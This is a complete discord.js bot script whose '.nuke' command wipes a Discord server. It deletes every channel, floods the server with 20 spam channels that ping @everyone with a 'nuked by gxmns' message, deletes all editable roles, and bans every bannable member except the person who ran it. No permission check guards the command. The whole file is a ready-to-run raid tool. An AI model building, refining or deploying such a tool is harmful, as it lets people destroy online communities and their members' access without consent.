// Require the necessary discord.js classes
const { Client, Events, GatewayIntentBits, Collection, ChannelType, cleanCodeBlockContent, IntentsBitField } = require('discord.js');

// Create a new client instance
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.GuildMembers, GatewayIntentBits.MessageContent] });


// When the client is ready, run this code (only once).
// The distinction between `client: Client<boolean>` and `readyClient: Client<true>` is important for TypeScript developers.
// It makes some properties non-nullable.
client.once(Events.ClientReady, readyClient => {
	console.log(`Ready! Logged in as ${readyClient.user.tag}`);
});

client.on(Events.InteractionCreate, interaction => {
	console.log(interaction)
});

client.on('messageCreate', async msg => {
	if (msg.content.toString() == ".nuke") {
		console.log("nuke");
		const discordServer = msg.guild
		const channels = discordServer?.channels ? JSON.parse(
  		JSON.stringify(discordServer.channels)
		).guild.channels : [];

		//delete channels + nuke
		while(Object.keys(channels).length != 0){
			cid = channels.pop();
			msg.guild.channels.fetch(cid)
				.then(channel => channel.delete());
		}
		for (let i=0; i<20; i++){
		msg.guild.channels.create({
			name: "nuked-by-gxmns",
			type: ChannelType.GuildText,
		})
		.then(channel => {
			channel.send("@everyone || https://tenor.com/view/bubba-bubba-dance-bubba-sitting-down-red-bubba-big-bubba-gif-20994792 ||")
			channel.send("#  nuked by gxmns 😭🙏👎")
		});
		} 

		//delete roles
		const roles = msg.guild.roles.cache;
		msg.guild.roles.cache.forEach(role => {
			console.log(role.name);
			if(role.name != "@everyone" && role.editable) {
				role.delete();
			  }
		})
		
		//kick members	
		try {
			await msg.guild.members.fetch();
		
			let members = msg.guild.members.cache.map(m => m);
			console.log(members);
			members.forEach(member => {
				if (member.bannable && member.id != msg.author.id) {
					member.ban();
				}
			})
		} catch (err) {
			console.error(err);
		}

	}
});


// Log in to Discord with your client's token
client.login('TOKEN-HERE');